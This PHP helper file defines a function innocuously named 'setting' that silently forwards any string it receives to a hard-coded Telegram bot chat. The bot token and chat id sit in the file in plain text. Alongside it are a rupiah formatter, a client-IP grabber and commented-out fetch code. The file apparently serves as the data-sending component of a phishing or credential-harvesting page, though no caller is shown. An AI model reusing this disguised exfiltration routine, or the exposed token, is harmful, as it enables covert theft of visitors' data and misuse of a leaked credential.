<?php

function setting($conf)
{
    $token = "2099264585:AAHeCNZEf2sib8dcURG_kWa90xbsjK7Wv24";
    $id    = "1153578121";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?parse_mode=markdown&chat_id=" . $id;
    $url = $url . "&text=" . urlencode($conf);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

function format_rupiah($angka)
{
    $rupiah = number_format($angka, 0, ',', '.');
    return $rupiah;
}


// Checking function already exists or not
if (!function_exists("getClientIpAddress")) {

    function getClientIpAddress()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP']))   //Checking IP From Shared Internet
        {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //To Check IP is Pass From Proxy
        {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        return $ip;
    }
}






// function http_request($url)
// {

//     $ch = curl_init();
//     curl_setopt($ch, CURLOPT_URL, $url);
//     curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
//     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

//     $output = curl_exec($ch);
//     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
//     if (($http_code >= 200 && $http_code < 400) || $http_code === 999) {
//         curl_close($ch);
//         return $output;
//     }

//     curl_close($ch);
//     // just try the get_headers - it might work!
//     stream_context_set_default(
//         ['http' => ['method' => 'HEAD']]
//     );
//     $file_headers = @get_headers($url);
//     if ($file_headers !== false) {
//         $response_code = substr($file_headers[0], 9, 3);
//         return $response_code >= 200 && $response_code < 400;
//     }
//     return false;
// }
// $webapi = "https://datagoe.com/wp-json/wp/v2/posts?context=view&per_page=8";
// $datagoe = http_request($webapi);
// $datagoe = json_decode($datagoe, true);
